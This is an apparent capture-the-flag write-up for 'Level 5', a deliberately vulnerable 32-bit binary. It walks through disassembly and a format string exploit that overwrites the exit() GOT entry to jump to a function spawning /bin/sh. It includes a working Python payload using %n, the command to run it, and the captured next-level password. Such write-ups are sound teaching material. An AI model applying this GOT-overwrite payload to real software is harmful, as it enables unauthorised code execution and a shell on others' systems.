# Level 5 — Format String Exploit (GOT Overwrite)

## Overview

This level is a **format string vulnerability** with a different exploitation technique.

* Input is read using `fgets()`
* Passed directly to `printf()`
* Program calls `exit()` after printing
* Goal: hijack execution flow by overwriting a GOT entry

---

## main Function

```asm
0x08048504 <+0>:	push   %ebp
0x08048505 <+1>:	mov    %esp,%ebp
0x08048507 <+3>:	and    $0xfffffff0,%esp
0x0804850a <+6>:	call   0x80484c2 <n>
0x0804850f <+11>:	leave  
0x08048510 <+12>:	ret
```

---

## n Function

```asm
0x080484e5 <+35>:	call   fgets@plt
0x080484f3 <+49>:	call   printf@plt
0x080484ff <+61>:	call   exit@plt
```

### Vulnerability

```c
printf(user_input);
```

This gives full **format string control**.

---

## Key Observation

After `printf`, the program calls:

```asm
call exit@plt
```

If we overwrite the **GOT entry of `exit`**, we can redirect execution.

---

## exit@plt

```asm
0x080483d0 <+0>:	jmp    *0x8049838
```

So:

```text
exit GOT = 0x08049838
```

---

## Target Function

```asm
0x080484a4 <o>:
call system("/bin/sh")
```

Address:

```text
0x080484a4
```

---

## Exploit Strategy

We overwrite:

```text
*(0x08049838) = 0x080484a4
```

So when `exit()` is called → it jumps to `o()` → spawns shell.

---

## Important Calculation

We want to write:

```text
0x080484a4 = 134513828 (decimal)
```

But:

* 4 bytes (address) are already printed

So:

```text
134513828 - 4 = 134513824
```

---

## Payload

```bash
python -c "print '\x08\x04\x98\x38'[::-1] + '%134513824d' + '%4\$n'" > /tmp/inj5
```

---

## Explanation

### Structure

```text
[address] + padding + %4$n
```

---

### `\x08\x04\x98\x38`

Address of `exit@GOT`

---

### `%134513824d`

Prints 134,513,824 characters
→ sets internal counter

---

### `%4$n`

* Takes 4th argument from stack
* Writes number of printed characters into it

---

## Exploitation

```bash
cat /tmp/inj5 - | ./level5
```

---

## Result

```bash
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

---

## Summary

1. Identify format string vulnerability
2. Find GOT entry of `exit`
3. Find address of `o()` function
4. Calculate required value
5. Adjust for printed bytes
6. Use `%n` to overwrite GOT
7. Trigger `exit()` → jump to shell

---
